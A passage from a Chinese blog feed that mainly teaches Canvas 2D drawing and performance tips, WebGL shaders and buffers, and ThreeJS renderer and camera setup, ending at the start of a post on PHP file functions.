src="https://camo.githubusercontent.com/3e58e2fd4dddfb2947bb4637d03cc8ae0773aefe/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c7065343373746e6a3230657130376a6a72392e6a7067" alt="img"></a></p><p>连续使用 <code>moveTo()</code> 可以让开始新的绘制点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath();</span><br><span class="line">ctx.moveTo(100, 100);</span><br><span class="line">ctx.lineTo(300, 300);</span><br><span class="line">ctx.lineTo(600, 300);</span><br><span class="line"></span><br><span class="line">ctx.moveTo(600, 400);</span><br><span class="line">ctx.lineTo(700, 400);</span><br><span class="line">ctx.stroke();</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/0f65ddb76a863f0782b8906fab6620ae6c1e8c1e/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c70673970376d336a323068303039647765642e6a7067"><img src="https://camo.githubusercontent.com/0f65ddb76a863f0782b8906fab6620ae6c1e8c1e/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c70673970376d336a323068303039647765642e6a7067" alt="img"></a></p><h3 id="绘制样式"><a href="#绘制样式" class="headerlink" title="绘制样式"></a>绘制样式</h3><p>在绘制前可以对绘制的线段进行样式设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctx.lineWidth = &quot;10&quot;;</span><br><span class="line">ctx.strokeStyle = &quot;red&quot;;</span><br><span class="line">... ...</span><br><span class="line">ctx.stock();</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/0664b9abf84d656b101c0c74eb710153a479f733/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c707731713961716a3230686b3061396139792e6a7067"><img src="https://camo.githubusercontent.com/0664b9abf84d656b101c0c74eb710153a479f733/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c707731713961716a3230686b3061396139792e6a7067" alt="img"></a></p><p>在绘制之后，使用 <code>fill()</code> 可以填充封闭图像（如果没有封闭也会自动封闭）的颜色，设置 <code>fillStyle</code> 属性可以来设置填充颜色：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">ctx.stock();</span><br><span class="line">ctx.fillStyle = &quot;skyblue&quot;</span><br><span class="line">ctx.fill();</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/760f8dd276b299739ac248d8abc11634fe782c95/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c71306e386a757a6a323068683039776d78342e6a7067"><img src="https://camo.githubusercontent.com/760f8dd276b299739ac248d8abc11634fe782c95/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c71306e386a757a6a323068683039776d78342e6a7067" alt="img"></a></p><p>使用了 <code>fill()</code> 之后，Canvas会自动认为之前的绘制操已经绘制了一个独立的图形。</p><h3 id="快速绘制"><a href="#快速绘制" class="headerlink" title="快速绘制"></a>快速绘制</h3><p><code>strokeReact(x, y, w, h)</code>快速绘制一个矩形</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillStyle = &quot;lightseagreen&quot;</span><br><span class="line">ctx.strokeReact(100, 100, 300, 200);</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/06653ad551c95cecb5a41eb54f16faba06db251e/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c7161697532656f6a3230623730367874386a2e6a7067"><img src="https://camo.githubusercontent.com/06653ad551c95cecb5a41eb54f16faba06db251e/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c7161697532656f6a3230623730367874386a2e6a7067" alt="img"></a></p><p>filRecto是一个快捷方法，让你省略了beginPath、move To、lineTo。所以fillRect（100，100，300，200）等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx.move(100，100);</span><br><span class="line">ctx.lineTo(400，100);</span><br><span class="line">ctx.lineTo(400，300);</span><br><span class="line">ctx.lineTo(100，300);</span><br><span class="line">ctx.closePath（);</span><br><span class="line">ctx.fill();</span><br></pre></td></tr></table></figure><h3 id="绘制复杂图像"><a href="#绘制复杂图像" class="headerlink" title="绘制复杂图像"></a>绘制复杂图像</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for (var i = 0; i &lt;= 500; i += 10) &#123;</span><br><span class="line">  ctx.beginPath();</span><br><span class="line">  ctx.moveTo(i, i);</span><br><span class="line">  ctx.lineTo(i + 200, i);</span><br><span class="line">  ctx.lineTo(i, i + 300);</span><br><span class="line">  ctx.closePath();</span><br><span class="line">  ctx.stroke();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://camo.githubusercontent.com/0d242357c4d02f47c1611c226017c45e87601f87/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c7166776373716f6a32306a733065646d78692e6a7067"><img src="https://camo.githubusercontent.com/0d242357c4d02f47c1611c226017c45e87601f87/68747470733a2f2f7773312e73696e61696d672e636e2f6c617267652f61373165666161666c793167326c7166776373716f6a32306a733065646d78692e6a7067" alt="img"></a></p><h2 id="2-4-Canvas动画"><a href="#2-4-Canvas动画" class="headerlink" title="2.4 Canvas动画"></a>2.4 Canvas动画</h2><p>如果想要在 Canvas 2D 画布中绘制出一组动画，那么需要进行如下几个步骤：</p><ol><li><strong>清空 canvas</strong><br>除非接下来要画的内容会完全充满 canvas （例如背景图），否则你需要清空所有。最简单的做法就是用 <code>clearRect</code> 方法。</li><li><strong>保存 canvas 状态</strong><br>如果你要改变一些会改变 canvas 状态的设置（样式，变形之类的），又要在每画一帧之时都是原始状态的话，你需要先保存一下。</li><li><strong>绘制动画图形（animated shapes）</strong><br>这一步才是重绘动画帧。</li><li><strong>恢复 canvas 状态</strong><br>如果已经保存了 canvas 的状态，可以先恢复它，然后重绘下一帧。</li></ol><h2 id="2-5-性能优化策略"><a href="#2-5-性能优化策略" class="headerlink" title="2.5 性能优化策略"></a>2.5 性能优化策略</h2><h3 id="使用-requestAnimationFrame"><a href="#使用-requestAnimationFrame" class="headerlink" title="使用 requestAnimationFrame"></a>使用 requestAnimationFrame</h3><p>requestAnimationFrame采用系统时间间隔，保持最佳绘制效率，不会因为间隔时间过短，造成过度绘制，增加开销；也不会因为间隔时间太长，使用动画卡顿不流畅，让各种网页动画效果能够有一个统一的刷新机制，从而节省系统资源，提高系统性能，改善视觉效果。</p><blockquote><p>大多数电脑显示器的刷新频率是<code>60Hz</code>，大概相当于每秒钟重绘<code>60</code>次。大多数浏览器都会对重绘操作加以限制，不超过显示器的重绘频率，因为即使超过那个频率用户体验也不会有提升。因此，最平滑动画的最佳循环间隔是<code>1000ms/60</code>，约等于<code>16.6ms</code>。</p></blockquote><p>requestAnimationFrame 的特点：</p><ul><li>requestAnimationFrame会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率</li><li>在隐藏或不可见的元素中，requestAnimationFrame将不会进行重绘或回流，这当然就意味着更少的CPU、GPU和内存使用量</li><li>requestAnimationFrame是由浏览器专门为动画提供的API，在运行时浏览器会自动优化方法的调用，并且如果页面不是激活状态下的话，动画会自动暂停，有效节省了CPU开销</li></ul><h3 id="使用离屏-canvas-优化性能"><a href="#使用离屏-canvas-优化性能" class="headerlink" title="使用离屏 canvas 优化性能"></a>使用离屏 canvas 优化性能</h3><p>如果要将相似图元重复绘制到屏幕的多个帧上，可以通过预呈现场景中较大的部分从而显著提升性能。预呈现是指在一张（或多张）离屏画布上呈现临时图片，然后使用 <code>drawImage()</code> 方法将离屏画布重新呈现到显示的画布上。离屏canvas的操作都是在内存中进行并且离屏canvas的任何操作都不会导致页面变(重绘、重排)</p><h3 id="避免浮点数的坐标点，用整数取而代之"><a href="#避免浮点数的坐标点，用整数取而代之" class="headerlink" title="避免浮点数的坐标点，用整数取而代之"></a>避免浮点数的坐标点，用整数取而代之</h3><p>当你画一个没有整数坐标点的对象时会发生子像素渲染。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.<span class="title function_">drawImage</span>(myImage, <span class="number">0.3</span>, <span class="number">0.5</span>);</span><br></pre></td></tr></table></figure><p>浏览器为了达到抗锯齿的效果会做额外的运算。为了避免这种情况，请保证在你调用 <code>drawImage()</code> 函数时，用<code>Math.floor()</code>函数对所有的坐标点取整。</p><h3 id="集中批量调用画布"><a href="#集中批量调用画布" class="headerlink" title="集中批量调用画布"></a>集中批量调用画布</h3><p>绘制操作的性能开销较高，因此效率更高的做法是，加载带有一长串命令的绘制状态机，然后通过状态机将命令全部转储到缓冲区中，最后集中进行绘制（<code>stock</code>）操作</p><h3 id="关闭透明度"><a href="#关闭透明度" class="headerlink" title="关闭透明度"></a>关闭透明度</h3><p>如果使用画布而且不需要透明，当使用 <code>HTMLCanvasElement.getContext()</code> 创建一个绘图上下文时把 <code>alpha</code> 选项设置为 <code>false</code> 。这个选项可以帮助浏览器进行内部优化。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>, &#123; <span class="attr">alpha</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure><h3 id="使用多层画布去画一个复杂的场景"><a href="#使用多层画布去画一个复杂的场景" class="headerlink" title="使用多层画布去画一个复杂的场景"></a>使用多层画布去画一个复杂的场景</h3><p>在绘制图像时，特别是制作游戏时，有些元素不断地改变或者移动，而其它的元素，例如外观，永远不变。这种情况的一种优化是去用多个画布元素去创建不同层次。</p><p>例如，我们可以在最顶层创建一个外观层，而且仅仅在用户输入的时候被画出。还可以创建一个游戏层，在上面会有不断更新的元素和一个背景层，给那些较少更新的元素。</p><h3 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h3><p>对于Canvas的优化策略大多都集中在如何减少画面的重绘工作量，这样可以通过降低Canvas的资源消耗从而提升性能，除了上述的常见优化方案，还有以下的优化方案：</p><ul><li>尽量利用 CSS</li><li>尽量不要频繁地调用比较耗时的API</li><li>渲染绘制操作不要频繁调用</li><li>尽量少的改变状态机 ctx的里状态</li><li>尽量少的调用 canvas API</li><li>用CSS transforms特性缩放画布</li><li>不要在用drawImage时缩放图像</li><li>将画布的函数调用集合到一起（例如，画一条折线，而不要画多条分开的直线）</li><li>使用不同的办法去清除画布 <code>clearRect()</code> vs. <code>fillRect()</code> vs. 调整canvas大小</li></ul><h1 id="3-WebGL"><a href="#3-WebGL" class="headerlink" title="3. WebGL"></a>3. WebGL</h1><p>WebGL是一种JavaScript API，用于在不使用插件的情况下在任何兼容的网页浏览器中呈现交互式2D和3D图形。WebGL完全集成到浏览器的所有网页标准中，可将影像处理和效果的GPU加速使用方式当做网页Canvas的一部分。</p><p>WebGL元素可以加入其他HTML元素之中并与网页或网页背景的其他部分混合。WebGL程序由JavaScript编写的句柄和OpenGL Shading Language（GLSL）编写的着色器代码组成，该语言类似于C或C++，并在计算机的图形处理器（GPU）上运行。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190820204937.png" alt="20190820204937.png"></p><h2 id="3-1-WebGL核心概念"><a href="#3-1-WebGL核心概念" class="headerlink" title="3.1 WebGL核心概念"></a>3.1 WebGL核心概念</h2><h3 id="着色器"><a href="#着色器" class="headerlink" title="着色器"></a>着色器</h3><p>在OpenGL ES 2.0 中可以使用着色器编程，意味着可以调用显卡并行运算的能力，来进行业务中需要的开发。</p><p>着色器是使用 OpenGL ES Shading Language(GLSL)编写的程序，它携带着绘制形状的顶点信息以及构造绘制在屏幕上像素的所需数据，换句话说，它负责记录着像素点的位置和颜色。</p><p>绘制WebGL时候有两种不同的着色器函数， <strong>顶点着色器（VertexShader）</strong> 和 <strong>片段着色器（FragmentShader）</strong> 。开发者需要通过用GLSL 编写这些着色器，并将代码文本传递给WebGL， 使之在GPU执行时编译。</p><blockquote><p>顶点着色器和片元着色器的代码是单独分开的，使用GLSL语言编写。</p></blockquote><p>顶点着色器的作用是计算顶点的位置。根据计算出的一系列顶点位置，WebGL 可以对点、线和三角形在内的一些图元进行光栅化处理。当对这些图元进行光栅化处理时需要使用片段着色器方法。片段着色器的作用是计算出当前绘制图元中每个像素的颜色值。</p><blockquote><p>光栅化是指将构成图形的一系列的点进行上色。</p></blockquote><h3 id="渲染管线"><a href="#渲染管线" class="headerlink" title="渲染管线"></a>渲染管线</h3><p>在开发WebGL应用程序时，我们需要写Shader语言代码与GPU进行沟通。使用JavaScript编写的程序，其中包括以下操作的控制代码：</p><ul><li>初始化WebGL − JavaScript是用于初始化WebGL的上下文。</li><li>创建数组 − 我们创建JavaScript数组来保存几何数据。</li><li>缓冲区对象 − 通过将数组作为参数来创建缓冲区对象(顶点和索引)。</li><li>着色器 − 我们创建，编译和使用JavaScript链接着色器。</li><li>属性− 我们可以创建属性，启用它们并使用JavaScript缓冲区对象相关联。</li><li>制服− 我们还可以使用 JavaScript 制服(uniforms)关联。</li><li>变换矩阵 − 使用JavaScript，我们可以创建变换矩阵。</li></ul><p>WebGL 渲染管线在 WebGL Api 下的执行过程如下图所示：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190820212148.png" alt="20190820212148.png"></p><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><p>buffer 是一个重要的概念，开发者在 js 中定义的坐标不能够直接使用，必须将原数据绑定到一个顶点着色器 buffer 中，再将这个顶点着色器与 WebGL 绑定，获取到在 GLSL 语言编写的着色器代码变量，buffer 可以自动将开发者编写的2d坐标转化为三维坐标点，再传入着色器代码中，以下是绘制一个三角形所需要生成的缓冲区：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initVertexBuffers</span>(<span class="params">gl</span>) &#123;</span><br><span class="line">  <span class="comment">// 传入三角形的三个顶点到 vertices</span></span><br><span class="line">  <span class="keyword">var</span> vertices = <span class="keyword">new</span> <span class="title class_">Float32Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">0.5</span>, -<span class="number">0.5</span>, -<span class="number">0.5</span>, <span class="number">0.5</span>, -<span class="number">0.5</span></span><br><span class="line">  ])</span><br><span class="line">  <span class="comment">// 顶点个数</span></span><br><span class="line">  <span class="keyword">var</span> n = <span class="number">3</span></span><br><span class="line">  <span class="comment">// 创建一个 buffer</span></span><br><span class="line">  <span class="keyword">var</span> vertexBuffer = gl.<span class="title function_">createBuffer</span>()</span><br><span class="line">  <span class="comment">// 将 vertexBuffer 与 webgl 绑定</span></span><br><span class="line">  gl.<span class="title function_">bindBuffer</span>(gl.<span class="property">ARRAY_BUFFER</span>, vertexBuffer)</span><br><span class="line">  <span class="comment">// 将数据写入到 vertexBuffer 中</span></span><br><span class="line">  gl.<span class="title function_">bufferData</span>(gl.<span class="property">ARRAY_BUFFER</span>, vertices, gl.<span class="property">STATIC_DRAW</span>)</span><br><span class="line">  <span class="comment">// 获取变量 a_Position 在 vertex shader 中的地址</span></span><br><span class="line">  <span class="keyword">var</span> a_Position = gl.<span class="title function_">getAttribLocation</span>(gl.<span class="property">program</span>, <span class="string">&#x27;a_Position&#x27;</span>)</span><br><span class="line">  <span class="comment">// 将 bufferData 传入到 a_Position 的地址，同时需要规定一个顶点对应数组中的几个数据</span></span><br><span class="line">  gl.<span class="title function_">vertexAttribPointer</span>(a_Position, <span class="number">2</span>, gl.<span class="property">FLOAT</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// 启用 a_Position variable</span></span><br><span class="line">  gl.<span class="title function_">enableVertexAttribArray</span>(a_Position)</span><br><span class="line">  <span class="keyword">return</span> n</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> n = <span class="title function_">initVertexBuffers</span>(gl)</span><br></pre></td></tr></table></figure><p>但是绘制于缓冲区的图像并不能展示在视图上，需要通过绘制才能展现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gl.<span class="title function_">clearColor</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment">// 绘制</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">draw</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 调用clear方法将当前绘制结果清空</span></span><br><span class="line">  gl.<span class="title function_">clear</span>(gl.<span class="property">COLOR_BUFFER_BIT</span>)</span><br><span class="line">  <span class="comment">// 按照三角形的图源去绘制，从 buffer 的起始位获取数据，绘制 n 个顶点</span></span><br><span class="line">  gl.<span class="title function_">drawArrays</span>(gl.<span class="property">TRIANGLES</span>, <span class="number">0</span>, n)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">draw</span>()</span><br></pre></td></tr></table></figure><h3 id="矩阵运算"><a href="#矩阵运算" class="headerlink" title="矩阵运算"></a>矩阵运算</h3><p>如果我们想让图像从初始位置移动到另一个位置，则需要通过相应的计算来得出目标位置的坐标，在WebGL中，坐标的运算则是需要通过矩阵运算得出的，最常见的移动为平移与绕轴旋转，他们的常用计算公式如下：</p><p><strong>在平面平移时的矩阵计算：</strong></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151121.png" alt="20190821151121.png"></p><p><strong>在旋转时的矩阵运算：</strong></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151156.png" alt="20190821151156.png"></p><p><strong>绕轴渲染的矩阵运算：</strong></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151215.png" alt="20190821151215.png"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190821151248.png" alt="20190821151248.png"></p><p>利用旋转矩阵，与计算好的矩阵与原坐标向量 （<code>a_Position</code>） 相乘，就可以得到图形处理后的向量了，利用这个原理就可以移动图形了。我们可以将定点着色器的GLSL代码改写为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">VSHADER_SOURCE</span> = <span class="string">`</span></span><br><span class="line"><span class="string">  attribute vec4 a_Position;</span></span><br><span class="line"><span class="string">  uniform mat4 u_ModelMatrix;</span></span><br><span class="line"><span class="string">  void main()&#123;</span></span><br><span class="line"><span class="string">    gl_Position = a_Position * u_ModelMatrix;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><p>定义了一个常量 <code>u_ModelMatrix</code> 我们传入这个常量与原向量相乘就可以得到新的顶点坐标位置。</p><h2 id="3-2-ThreeJS"><a href="#3-2-ThreeJS" class="headerlink" title="3.2 ThreeJS"></a>3.2 ThreeJS</h2><h3 id="ThreeJS-概述"><a href="#ThreeJS-概述" class="headerlink" title="ThreeJS 概述"></a>ThreeJS 概述</h3><p>由于原生WebGL相对复杂，所以使用ThreeJS可以大幅减少开发成本，ThreeJS 将常用的 WebGL 表达式、算法、图形封装，以便开发者可以便捷使用，减少对 WebGL 复杂 api 的使用。</p><p>使用 ThreeJS 的优势：</p><ul><li>弥补原生 WebGL 的缺乏抽象和模块化的缺点</li><li>简便图形学算法的实现</li><li>简化 GLSL 开发和调试，尽量避免使用 GLSL</li></ul><p>缺点：</p><ul><li>缺少自由度</li></ul><p>以下是 ThreeJS 中封装的主要对象：</p><p><img src="http://study.esunr.xyz/1577946595924.png" alt=""></p><h3 id="渲染器-Renderer"><a href="#渲染器-Renderer" class="headerlink" title="渲染器 Renderer"></a>渲染器 Renderer</h3><p>在场景中设立了物体与光线以及相机后，需要渲染器将场景渲染出来。</p><p>Renderer要绑定一个canvas对象，实例化一个 Renderer 的过程如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo-canvas&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> renderer = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">WebGLRenderer</span>(&#123;</span><br><span class="line">  <span class="attr">canvas</span>: canvas</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>通过 Render 可以设置背景色与大小，通常这个大小与整个画布相等：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">renderer.<span class="title function_">setClearColor</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Color</span>(<span class="number">0x000000</span>, <span class="number">1.0</span>))</span><br><span class="line">renderer.<span class="title function_">setSize</span>(<span class="number">400</span>, <span class="number">400</span>)</span><br></pre></td></tr></table></figure><p>当完成了相机和场景的定义后，就可以使用渲染器上的 <code>render()</code> 方法将其渲染到画面上，第一个参数位传入实例化的 scene，第二个参数位传入实例化的 camera：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">renderer.<span class="title function_">render</span>(scene, camera)</span><br></pre></td></tr></table></figure><p>通常渲染器会放在一个render函数中被重复调用，渲染器在每次渲染时会自动将上一帧场景清除，重新绘制一帧，这样不停的重新渲染，就会产生动态效果了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> render = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// ... 每一帧对场景进行应有的变动</span></span><br><span class="line">  renderer.<span class="title function_">render</span>(scene, camera)</span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(render)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="相机-Camera"><a href="#相机-Camera" class="headerlink" title="相机 Camera"></a>相机 Camera</h3><p>在 ThreeJS 中相机分为两种相机，分别是 <strong>正交投影相机</strong> 与 <strong>透视投影相机</strong>。</p><p><strong>正交投影相机 OrthographicCamera：</strong></p><p><img src="https://pic4.zhimg.com/80/v2-62ede52e0bb0d8b49f6cf2e41debc247_hd.jpg" alt=""></p><blockquote><p>注：图中的”视点”对应着Three中的Camera。</p><p>这里补充一个视景体的概念：视景体是一个几何体，只有视景体内的物体才会被我们看到，视景体之外的物体将被裁剪掉。这是为了去除不必要的运算。</p><p>正交投影相机的视景体是一个长方体，OrthographicCamera的构造函数是这样的：OrthographicCamera( left, right, top, bottom, near, far )</p><p>Camera本身可以看作是一个点，left则表示左平面在左右方向上与Camera的距离。另外几个参数同理。于是六个参数分别定义了视景体六个面的位置。</p><p>可以近似地认为，视景体里的物体平行投影到近平面上，然后近平面上的图像被渲染到屏幕上。</p></blockquote><p>实例化一个简单的正交相机可以使用 <code>new THREE.OrthographicCamera()</code> 传入的参数分别为定义的空间范围（上下左右前后）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> camera = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">OrthographicCamera</span>(-width / <span class="number">2</span>, width / <span class="number">2</span>, height / <span class="number">2</span>, -height / <span class="number">2</span>, -<span class="number">1000</span>, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>在一个3D的空间中，相机需要摆放到一个固定的点去观察物体，同时还要设置观察的方向：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 相机由 (0,0,100) 的坐标望向 (0,0,0) 的坐标</span></span><br><span class="line">camera.<span class="property">position</span>.<span class="property">x</span> = <span class="number">0</span></span><br><span class="line">camera.<span class="property">position</span>.<span class="property">y</span> = <span class="number">0</span></span><br><span class="line">camera.<span class="property">position</span>.<span class="property">z</span> = <span class="number">100</span></span><br><span class="line">camera.<span class="title function_">lookAt</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>假如我们在点 (0,0,0) 处设置了一个平面三角形，按照相机的摆放位置看上去是这样的：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190824174049.png" alt="20190824174049.png"></p><p>当将相机摆放在(100,100,100)的位置，即摆放在三角形的右上角，观察三角形的情况为：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190824174230.png" alt="20190824174230.png"></p><blockquote><p>由于我们使用了正交相机，图形没有近大远小的效果，看起来很奇怪，但是由 AxisHelp 坐标可以看出视角已经发生了变化</p></blockquote><p><strong>透视投影相机：</strong></p><p><img src="https://pic2.zhimg.com/80/v2-3b160a77bda7661c4dd3920ddeaae605_hd.jpg" alt=""></p><blockquote><p>透视投影相机的视景体是个四棱台，它的构造函数是这样的：PerspectiveCamera( fov, aspect, near, far )</p><p>fov对应着图中的视角，是上下两面的夹角。aspect是近平面的宽高比。在加上近平面距离near，远平面距离far，就可以唯一确定这个视景体了。</p><p>透视投影相机很符合我们通常的看东西的感觉，因此大多数情况下我们都是用透视投影相机展示3D效果。</p></blockquote><p><strong>场景：</strong></p><p>场景是所有物体的容器，也对应着我们创建的三维世界，只有我们在 scene 中添加的物体才会被展示出来。</p><p>创建一个 scene 实例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> scene = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Scene</span>()</span><br></pre></td></tr></table></figure><p>向scene中添加一个物体，如AxisHelper（辅助坐标，可以帮助我们观察场景）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> axesHelper = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">AxisHelper</span>(<span class="number">100</span>)</span><br><span class="line">scene.<span class="title function_">add</span>(<span class="variable language_">this</span>.<span class="property">axesHelper</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 可视化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
            <tag> 研究报告 </tag>
            
            <tag> CSS3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件操作以及文件的上传与下载</title>
      <link href="/2020/01/ead3ce88df8c.html"/>
      <url>/2020/01/ead3ce88df8c.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-获取文件信息"><a href="#1-获取文件信息" class="headerlink" title="1. 获取文件信息"></a>1. 获取文件信息</h1><p><code>is_file(string $filePath): bool</code> 可以用来判断是否是文件类型，返回一个布尔类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_file</span>(<span class="string">&#x27;./text.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>is_dir(string $dirPath): bool</code>  可以用来判断是否是文件夹，返回一个布尔值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./floder&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>filesize(string $filePath): int</code> 用来获取文件的大小，返回一个字节大小</p><p><code>is_readable(string $filePath): bool</code> 判断文件是否可读写</p><p><code>is_writeable(string $filePath): bool</code> 